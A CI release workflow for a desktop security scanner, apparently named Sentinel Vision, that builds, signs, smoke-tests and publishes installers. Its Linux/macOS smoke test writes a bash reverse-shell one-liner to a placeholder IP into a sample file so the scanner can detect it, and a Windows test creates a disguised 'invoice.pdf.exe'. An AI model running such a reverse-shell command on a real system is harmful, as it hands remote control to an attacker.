name: Release

# Builds the Windows installer + portable zip, the macOS app and the Linux bundle, smoke-tests each one on a
# clean machine (the Windows installer is installed, upgraded, relaunched and uninstalled), and — for version
# tags — publishes them with SHA-256 checksums as a GitHub Release.
#
# Optional Windows code signing: add repository secrets WINDOWS_CERT_PFX_BASE64 (base64 of a .pfx code-signing
# certificate) and WINDOWS_CERT_PASSWORD. Without them the builds are produced unsigned.

on:
  push:
    tags: ["v*"]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - uses: actions/checkout@v7
      - id: v
        shell: bash
        run: |
          version=$(python3 -c "import re;print(re.search(r'__version__ = \"([^\"]+)\"', open('src/sentinel_vision/__init__.py').read()).group(1))")
          echo "version=$version" >> "$GITHUB_OUTPUT"
          if [[ "$GITHUB_REF" == refs/tags/v* && "${GITHUB_REF#refs/tags/v}" != "$version" ]]; then
            echo "::error::Tag ${GITHUB_REF#refs/tags/} does not match __version__ $version"; exit 1
          fi
          echo "Building version $version"

  windows:
    needs: version
    runs-on: windows-latest
    env:
      VERSION: ${{ needs.version.outputs.version }}
      WINDOWS_CERT_PFX_BASE64: ${{ secrets.WINDOWS_CERT_PFX_BASE64 }}
      WINDOWS_CERT_PASSWORD: ${{ secrets.WINDOWS_CERT_PASSWORD }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Install build tools
        run: |
          python -m pip install --upgrade pip
          pip install . pyinstaller
          choco upgrade innosetup --no-progress -y
      - name: Build app (PyInstaller)
        run: pyinstaller --noconfirm packaging/sentinel_vision.spec
      - name: Sign executables (optional)
        if: env.WINDOWS_CERT_PFX_BASE64 != ''
        shell: pwsh
        run: |
          $pfx = Join-Path $env:RUNNER_TEMP "cert.pfx"
          [IO.File]::WriteAllBytes($pfx, [Convert]::FromBase64String($env:WINDOWS_CERT_PFX_BASE64))
          $signtool = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\bin\*\x64\signtool.exe" | Sort-Object FullName -Descending | Select-Object -First 1
          & $signtool.FullName sign /f $pfx /p $env:WINDOWS_CERT_PASSWORD /fd sha256 /tr http://timestamp.digicert.com /td sha256 dist\SentinelVision\SentinelVision.exe dist\SentinelVision\sentinel-vision-cli.exe
          if ($LASTEXITCODE -ne 0) { throw "signing failed" }
      - name: Build installer (Inno Setup)
        shell: pwsh
        run: |
          $iscc = "${env:ProgramFiles(x86)}\Inno Setup 6\ISCC.exe"
          if (-not (Test-Path $iscc)) { $iscc = "$env:ProgramFiles\Inno Setup 6\ISCC.exe" }
          & $iscc "/DAppVersion=$env:VERSION" packaging\windows\SentinelVision.iss
          if ($LASTEXITCODE -ne 0) { throw "ISCC failed with $LASTEXITCODE" }
      - name: Sign installer (optional)
        if: env.WINDOWS_CERT_PFX_BASE64 != ''
        shell: pwsh
        run: |
          $pfx = Join-Path $env:RUNNER_TEMP "cert.pfx"
          $signtool = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\bin\*\x64\signtool.exe" | Sort-Object FullName -Descending | Select-Object -First 1
          & $signtool.FullName sign /f $pfx /p $env:WINDOWS_CERT_PASSWORD /fd sha256 /tr http://timestamp.digicert.com /td sha256 "dist\installer\SentinelVision-$env:VERSION-Setup.exe"
          if ($LASTEXITCODE -ne 0) { throw "signing failed" }
          Remove-Item $pfx
      - name: Package
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force out | Out-Null
          Copy-Item "dist\installer\SentinelVision-$env:VERSION-Setup.exe" out\
          Compress-Archive -Path dist\SentinelVision -DestinationPath "out\SentinelVision-$env:VERSION-windows-portable.zip"
          Get-ChildItem out
      - uses: actions/upload-artifact@v4
        with:
          name: windows
          path: out/*
          if-no-files-found: error

  windows-installer-test:
    needs: [version, windows]
    runs-on: windows-latest
    timeout-minutes: 30
    env:
      VERSION: ${{ needs.version.outputs.version }}
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: windows
          path: out
      - name: Install, verify, upgrade, relaunch and uninstall
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          function Assert($cond, $msg) { if (-not $cond) { throw "ASSERTION FAILED: $msg" } else { Write-Host "OK  $msg" } }
          function Invoke-Setup([string]$exe, [string[]]$arguments, [string]$label) {
            # Start-Process -Wait would also wait for programs the installer launches (the app itself), so wait
            # for the installer process only, with a timeout.
            $proc = Start-Process $exe -ArgumentList $arguments -PassThru
            $null = $proc.Handle
            if (-not $proc.WaitForExit(300000)) { throw "$label did not finish within 5 minutes" }
            if ($proc.ExitCode -ne 0) { throw "$label exit code $($proc.ExitCode)" }
            Write-Host "OK  $label finished"
          }
          function Annotate([string]$text) {
            # Surface diagnostics as a check-run annotation (readable without downloading logs).
            $enc = $text.Replace('%', '%25').Replace("`r", '').Replace("`n", '%0A')
            Write-Host "::error title=Windows installer test::$enc"
          }
          try {
          $setup = (Resolve-Path "out\SentinelVision-$env:VERSION-Setup.exe").Path
          $app = Join-Path $env:LOCALAPPDATA 'Programs\Sentinel Vision'
          $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

          Write-Host "== silent per-user install with start-at-sign-in and PATH"
          Invoke-Setup $setup @('/VERYSILENT','/SUPPRESSMSGBOXES','/NORESTART','/CURRENTUSER','/TASKS="autostart,addtopath"','/LOG="install1.log"') "first install"
          Assert (Test-Path "$app\SentinelVision.exe") "GUI executable installed"
          Assert (Test-Path "$app\sentinel-vision-cli.exe") "CLI executable installed"
          Assert (Test-Path "$app\unins000.exe") "uninstaller installed"
          Assert (Test-Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Sentinel Vision.lnk") "Start menu shortcut created"
          $run = (Get-ItemProperty $runKey).SentinelVision
          Assert ($run -eq "`"$app\SentinelVision.exe`" --minimized") "start-at-sign-in registered: $run"
          $userPath = (Get-ItemProperty 'HKCU:\Environment').Path
          Assert ($userPath -like "*$app*") "install folder added to user PATH"

          Write-Host "== command-line tool"
          & "$app\sentinel-vision-cli.exe" --version
          Assert ($LASTEXITCODE -eq 0) "cli --version"
          $status = & "$app\sentinel-vision-cli.exe" status | Out-String
          Write-Host $status
          Assert ($LASTEXITCODE -eq 0) "cli status exit code 0"
          Assert ($status -match 'start at sign-in:\s+on') "cli reports start at sign-in on"
          $samples = Join-Path $env:RUNNER_TEMP 'samples'
          New-Item -ItemType Directory -Force $samples | Out-Null
          [IO.File]::WriteAllBytes("$samples\invoice.pdf.exe", [byte[]](@(0x4D,0x5A) + (,0 * 512)))
          [IO.File]::WriteAllText("$samples\notes.txt", "hello")
          & "$app\sentinel-vision-cli.exe" scan $samples --no-quarantine
          Assert ($LASTEXITCODE -eq 1) "cli scan finds the disguised executable (exit code 1)"

          Write-Host "== GUI starts hidden in the tray and stays running"
          $gui = Start-Process "$app\SentinelVision.exe" -ArgumentList '--minimized' -PassThru
          Start-Sleep -Seconds 25
          Assert (-not $gui.HasExited) "GUI still running after 25 s"
          $log = Join-Path $env:LOCALAPPDATA 'SentinelVision\logs\sentinel.log'
          if (Test-Path $log) { Get-Content $log -Tail 40 }
          if (Test-Path $log) { Assert (-not (Select-String -Path $log -Pattern 'Traceback' -Quiet)) "no Python tracebacks in the app log" }

          Write-Host "== upgrade over the running app (installer must close it)"
          Invoke-Setup $setup @('/VERYSILENT','/SUPPRESSMSGBOXES','/NORESTART','/LOG="install2.log"') "upgrade over running app"
          Start-Sleep -Seconds 3
          Assert ($null -eq (Get-Process SentinelVision -ErrorAction SilentlyContinue)) "running app was closed for the upgrade"
          Assert ((Get-ItemProperty $runKey).SentinelVision -eq "`"$app\SentinelVision.exe`" --minimized") "previous options kept on upgrade"

          Write-Host "== self-update style install relaunches the app"
          Invoke-Setup $setup @('/SILENT','/SUPPRESSMSGBOXES','/NORESTART','/RELAUNCH=1','/LOG="install3.log"') "self-update style install"
          Start-Sleep -Seconds 15
          Assert ($null -ne (Get-Process SentinelVision -ErrorAction SilentlyContinue)) "app relaunched after /RELAUNCH=1 install"

          Write-Host "== unticking start-at-sign-in on upgrade removes it"
          Invoke-Setup $setup @('/VERYSILENT','/SUPPRESSMSGBOXES','/NORESTART','/TASKS="addtopath"','/LOG="install4.log"') "install without start-at-sign-in"
          Assert ($null -eq (Get-ItemProperty $runKey -Name SentinelVision -ErrorAction SilentlyContinue)) "start-at-sign-in removed"

          Write-Host "== silent uninstall"
          & "$app\sentinel-vision-cli.exe" autostart on | Out-Host
          Assert ($null -ne (Get-ItemProperty $runKey -Name SentinelVision -ErrorAction SilentlyContinue)) "app can turn start-at-sign-in on"
          Invoke-Setup "$app\unins000.exe" @('/VERYSILENT','/SUPPRESSMSGBOXES','/NORESTART') "uninstaller"
          $deadline = (Get-Date).AddSeconds(90)
          while ((Test-Path "$app\SentinelVision.exe") -and (Get-Date) -lt $deadline) { Start-Sleep -Seconds 2 }
          Assert (-not (Test-Path "$app\SentinelVision.exe")) "program files removed"
          Assert ($null -eq (Get-ItemProperty $runKey -Name SentinelVision -ErrorAction SilentlyContinue)) "start-at-sign-in removed by uninstaller"
          $userPath = (Get-ItemProperty 'HKCU:\Environment').Path
          Assert (-not ($userPath -like "*$app*")) "PATH entry removed"
          Assert ($null -eq (Get-Process SentinelVision -ErrorAction SilentlyContinue)) "no app process left running"
          Assert (-not (Test-Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Sentinel Vision.lnk")) "Start menu shortcut removed"
          Write-Host "Windows installer lifecycle: ALL CHECKS PASSED"
          Write-Host "::notice title=Windows installer test::Install, CLI, GUI, upgrade, relaunch, option change and uninstall all passed"
          } catch {
            $details = "$($_.Exception.Message)`n"
            foreach ($f in @('install1.log','install2.log','install3.log','install4.log')) {
              if (Test-Path $f) { $details += "--- $f (tail)`n" + ((Get-Content $f -Tail 15) -join "`n") + "`n" }
            }
            $log = Join-Path $env:LOCALAPPDATA 'SentinelVision\logs\sentinel.log'
            if (Test-Path $log) { $details += "--- sentinel.log (tail)`n" + ((Get-Content $log -Tail 25) -join "`n") }
            Annotate $details
            throw
          }
      - name: Upload installer logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: installer-logs
          path: "*.log"
          if-no-files-found: ignore

  unix:
    needs: version
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: macos-latest
            name: macos
          - os: ubuntu-22.04  # oldest supported glibc (2.35) so the bundle runs on Ubuntu 22.04+ / Debian 12+
            name: linux
    runs-on: ${{ matrix.os }}
    env:
      VERSION: ${{ needs.version.outputs.version }}
      QT_QPA_PLATFORM: offscreen
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Qt runtime libraries (Linux)
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update
          sudo apt-get install -y libegl1 libxkbcommon0 libgl1 libfontconfig1 libdbus-1-3
      - run: pip install . pyinstaller
      - run: pyinstaller --noconfirm packaging/sentinel_vision.spec
      - name: Smoke test
        shell: bash
        run: |
          set -euo pipefail
          if [[ "$RUNNER_OS" == "macOS" ]]; then bin="dist/SentinelVision.app/Contents/MacOS"; else bin="dist/SentinelVision"; fi
          "$bin/sentinel-vision-cli" --version
          "$bin/sentinel-vision-cli" status
          mkdir -p "$RUNNER_TEMP/samples"
          printf '#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n' > "$RUNNER_TEMP/samples/backdoor.sh"
          set +e; "$bin/sentinel-vision-cli" scan "$RUNNER_TEMP/samples" --no-quarantine; code=$?; set -e
          test "$code" -eq 1 || { echo "expected exit code 1, got $code"; exit 1; }
          "$bin/SentinelVision" --minimized & pid=$!
          sleep 20
          kill -0 "$pid" || { echo "GUI exited early"; exit 1; }
          kill "$pid"
      - name: Package
        shell: bash
        run: |
          mkdir -p out
          if [[ "$RUNNER_OS" == "macOS" ]]; then
            ditto -c -k --keepParent dist/SentinelVision.app "out/SentinelVision-$VERSION-macos.zip"
          else
            tar -C dist -czf "out/SentinelVision-$VERSION-linux-x86_64.tar.gz" SentinelVision
          fi
          ls -la out
      - uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.name }}
          path: out/*
          if-no-files-found: error

  publish:
    needs: [version, windows, windows-installer-test, unix]
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    permissions:
      contents: write
    env:
      VERSION: ${{ needs.version.outputs.version }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/download-artifact@v4
        with:
          path: artifacts
          merge-multiple: true
      - name: Checksums and release notes
        shell: bash
        run: |
          set -euo pipefail
          cd artifacts
          ls -la
          test -f "SentinelVision-$VERSION-Setup.exe"
          sha256sum SentinelVision-* > SHA256SUMS.txt
          cat SHA256SUMS.txt
          cd ..
          awk -v v="$VERSION" '$0 ~ "^## \\[" v "\\]" {f=1; next} /^## \[/ {f=0} f' CHANGELOG.md > notes.md
          {
            echo
            echo "### Downloads"
            echo
            echo "| | |"
            echo "|---|---|"
            echo "| **Windows (recommended)** | \`SentinelVision-$VERSION-Setup.exe\` |"
            echo "| Windows portable | \`SentinelVision-$VERSION-windows-portable.zip\` |"
            echo "| macOS 14+ (Apple Silicon) | \`SentinelVision-$VERSION-macos.zip\` |"
            echo "| Linux x86-64 | \`SentinelVision-$VERSION-linux-x86_64.tar.gz\` |"
            echo
            echo "Verify downloads against \`SHA256SUMS.txt\`. Builds are not code-signed yet, so Windows SmartScreen"
            echo "shows *Windows protected your PC* — click **More info → Run anyway**. See the README for details."
          } >> notes.md
          cat notes.md
      - uses: softprops/action-gh-release@v2
        with:
          name: Sentinel Vision ${{ env.VERSION }}
          body_path: notes.md
          files: |
            artifacts/SentinelVision-*
            artifacts/SHA256SUMS.txt
          fail_on_unmatched_files: true
